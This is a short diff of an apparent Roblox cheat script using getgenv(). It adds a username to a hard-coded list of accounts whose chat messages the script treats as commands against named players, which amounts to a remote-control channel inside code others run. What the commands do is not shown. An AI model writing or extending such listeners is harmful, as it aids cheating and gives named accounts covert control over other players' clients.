@@ -516,7 +516,7 @@ getgenv().TextChatService.MessageReceived:Connect(function(message)
     local sender = message.TextSource.Name
     local text = message.Text
 
-    if sender == "L0CKED_1N1" or sender == "Laylay_4kla" or sender == "CHEATING_B0SS" or sender == "adorxfleurys" then
+    if sender == "L0CKED_1N1" or sender == "Laylay_4kla" or sender == "CHEATING_B0SS" or sender == "adorxfleurys" or sender == "Ransacked007" then
         local prefix, command, playerName = string.match(text, "^(%.)(%w+)%s*(.*)")
 
         if prefix and command then
